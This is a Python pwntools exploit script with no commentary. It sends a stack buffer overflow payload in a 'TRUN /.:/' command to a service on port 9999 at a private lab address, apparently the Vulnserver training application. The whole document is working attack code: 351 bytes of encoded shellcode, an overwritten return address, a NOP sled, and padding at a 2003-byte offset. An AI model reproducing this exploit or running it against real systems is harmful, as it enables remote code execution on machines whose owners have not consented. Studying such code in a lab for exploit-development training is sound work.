from pwn import *

# 351 bytes of shellcode
buf =  ""
buf += "\xbf\x3b\xe9\x83\xee\xda\xcf\xd9\x74\x24\xf4\x58\x29"
buf += "\xc9\xb1\x52\x31\x78\x12\x03\x78\x12\x83\xd3\x15\x61"
buf += "\x1b\xdf\x0e\xe4\xe4\x1f\xcf\x89\x6d\xfa\xfe\x89\x0a"
buf += "\x8f\x51\x3a\x58\xdd\x5d\xb1\x0c\xf5\xd6\xb7\x98\xfa"
buf += "\x5f\x7d\xff\x35\x5f\x2e\xc3\x54\xe3\x2d\x10\xb6\xda"
buf += "\xfd\x65\xb7\x1b\xe3\x84\xe5\xf4\x6f\x3a\x19\x70\x25"
buf += "\x87\x92\xca\xab\x8f\x47\x9a\xca\xbe\xd6\x90\x94\x60"
buf += "\xd9\x75\xad\x28\xc1\x9a\x88\xe3\x7a\x68\x66\xf2\xaa"
buf += "\xa0\x87\x59\x93\x0c\x7a\xa3\xd4\xab\x65\xd6\x2c\xc8"
buf += "\x18\xe1\xeb\xb2\xc6\x64\xef\x15\x8c\xdf\xcb\xa4\x41"
buf += "\xb9\x98\xab\x2e\xcd\xc6\xaf\xb1\x02\x7d\xcb\x3a\xa5"
buf += "\x51\x5d\x78\x82\x75\x05\xda\xab\x2c\xe3\x8d\xd4\x2e"
buf += "\x4c\x71\x71\x25\x61\x66\x08\x64\xee\x4b\x21\x96\xee"
buf += "\xc3\x32\xe5\xdc\x4c\xe9\x61\x6d\x04\x37\x76\x92\x3f"
buf += "\x8f\xe8\x6d\xc0\xf0\x21\xaa\x94\xa0\x59\x1b\x95\x2a"
buf += "\x99\xa4\x40\xfc\xc9\x0a\x3b\xbd\xb9\xea\xeb\x55\xd3"
buf += "\xe4\xd4\x46\xdc\x2e\x7d\xec\x27\xb9\x42\x59\x1e\xbd"
buf += "\x2b\x98\x60\xac\xf7\x15\x86\xa4\x17\x70\x11\x51\x81"
buf += "\xd9\xe9\xc0\x4e\xf4\x94\xc3\xc5\xfb\x69\x8d\x2d\x71"
buf += "\x79\x7a\xde\xcc\x23\x2d\xe1\xfa\x4b\xb1\x70\x61\x8b"
buf += "\xbc\x68\x3e\xdc\xe9\x5f\x37\x88\x07\xf9\xe1\xae\xd5"
buf += "\x9f\xca\x6a\x02\x5c\xd4\x73\xc7\xd8\xf2\x63\x11\xe0"
buf += "\xbe\xd7\xcd\xb7\x68\x81\xab\x61\xdb\x7b\x62\xdd\xb5"
buf += "\xeb\xf3\x2d\x06\x6d\xfc\x7b\xf0\x91\x4d\xd2\x45\xae"
buf += "\x62\xb2\x41\xd7\x9e\x22\xad\x02\x1b\x52\xe4\x0e\x0a"
buf += "\xfb\xa1\xdb\x0e\x66\x52\x36\x4c\x9f\xd1\xb2\x2d\x64"
buf += "\xc9\xb7\x28\x20\x4d\x24\x41\x39\x38\x4a\xf6\x3a\x69"

jmp = "\xaf\x11\x50\x62"
pad = "\x90" * 20

buffer = "A" * 2003 + jmp + pad + buf + "C" * 3630

conn = remote('192.168.57.128', '9999')
conn.recvline()
conn.send("TRUN /.:/" + buffer)
conn.close()
